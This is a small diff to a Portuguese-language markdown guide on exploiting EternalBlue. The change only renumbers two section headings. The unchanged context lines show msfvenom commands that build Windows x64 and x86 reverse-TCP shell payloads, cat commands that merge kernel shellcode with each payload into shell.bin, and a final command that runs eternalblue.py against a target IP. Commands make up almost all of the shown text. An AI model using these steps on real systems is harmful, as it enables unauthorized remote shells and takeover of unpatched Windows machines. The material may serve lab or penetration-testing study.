@@ -36,7 +36,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=IP --platform windows
 msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=IP --platform windows -a x86 --format raw -o sc_x86_payload.bin
 ```
 
-### Fazendo o Merge dos arquivos:
+## 4. Fazendo o Merge dos arquivos:
 
 ### x64
 ```
@@ -47,7 +47,7 @@ cat sc_x64_kernel.bin sc_x64_payload.bin > shell.bin
 cat sc_x86_kernel.bin sc_x86_payload.bin > shell.bin
 ```
 
-## 4. Exploit:
+## 5. Exploit:
 
 ```
 python3 eternalblue.py Alvo-IP shell.bin
